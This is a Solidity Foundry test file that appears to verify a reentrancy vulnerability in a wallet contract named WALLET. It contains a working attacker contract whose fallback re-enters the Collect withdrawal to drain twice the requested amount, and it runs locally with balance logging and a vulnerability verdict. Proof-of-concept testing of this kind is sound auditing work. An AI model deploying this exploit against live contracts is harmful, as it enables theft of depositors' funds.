// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract LogMock {
    function AddMessage(address, uint256, string memory) public {
        // Mock implementation does nothing
    }
}

contract MaliciousAttacker {
    WALLET public wallet;
    bool public called;
    
    constructor(WALLET _wallet) payable {
        wallet = _wallet;
    }

    function deposit() public {
        wallet.Put{value: address(this).balance}(0);
    }

    function attack(uint256 amount) public {
        wallet.Collect(amount);
    }

    fallback() external payable {
        if (!called) {
            called = true;
            wallet.Collect(msg.value);
        }
    }
}

contract WALLETReentrancyTest is Test {
    WALLET public wallet;
    MaliciousAttacker public attacker;
    
    uint256 public constant VICTIM_DEPOSIT = 10 ether;
    uint256 public constant ATTACKER_DEPOSIT = 1 ether;
    uint256 public constant ATTACK_AMOUNT = 1 ether;  // Fixed attack amount

    function setUp() public {
        // Deploy mock Log and Wallet contracts
        LogMock mockLog = new LogMock();
        wallet = new WALLET(address(mockLog));
        
        // Create attacker contract with funds
        attacker = new MaliciousAttacker{value: ATTACKER_DEPOSIT}(wallet);
        
        // Deposit victim funds to wallet
        deal(address(this), VICTIM_DEPOSIT);
        wallet.Put{value: VICTIM_DEPOSIT}(0);
        
        // Deposit attacker funds to wallet
        attacker.deposit();
        
        // Fast-forward time to satisfy unlockTime condition
        vm.warp(block.timestamp + 1 days);
    }

    function testReentrancyAttack() public {
        // Initialize state capture
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("--- BEFORE-TRIGGER STATE ---");
        console2.log("Wallet ETH balance:", walletBalanceBefore);
        console2.log("Attacker ETH balance:", attackerBalanceBefore);
        
        console2.log("--- TRIGGER ATTACK ---");
        attacker.attack(ATTACK_AMOUNT);
        
        // Capture post-attack state
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("\n--- AFTER-TRIGGER STATE ---");
        console2.log("Wallet ETH balance:", walletBalanceAfter);
        console2.log("Attacker ETH balance:", attackerBalanceAfter);
        
        // Calculate changes
        uint256 walletLoss = walletBalanceBefore - walletBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        bool reentrancyOccurred = (attackerGain == 2 * ATTACK_AMOUNT) && 
                                (walletLoss == 2 * ATTACK_AMOUNT);
        
        console2.log("\n--- DIFFERENTIAL VERIFICATION ---");
        console2.log("Wallet balance change (loss): %d", walletLoss);
        console2.log("Attacker balance change (gain): %d", attackerGain);
        
        // Final vulnerability verdict
        if (reentrancyOccurred) {
            console2.log("VERDICT: Vulnerability Exists: Reentrancy allowed double withdrawal - attacker gained double the requested amount");
        } else {
            console2.log("VERDICT: Vulnerability not Exist: Balance changes don't indicate successful reentrancy attack");
        }

        // Keep original assertions for test functionality
        uint256 expectedWalletLoss = ATTACK_AMOUNT * 2;
        assertEq(
            attackerBalanceAfter, 
            expectedWalletLoss, 
            "Attacker should receive double the requested amount"
        );
        assertEq(
            walletBalanceAfter, 
            walletBalanceBefore - expectedWalletLoss, 
            "Wallet should lose double the requested amount"
        );
    }
}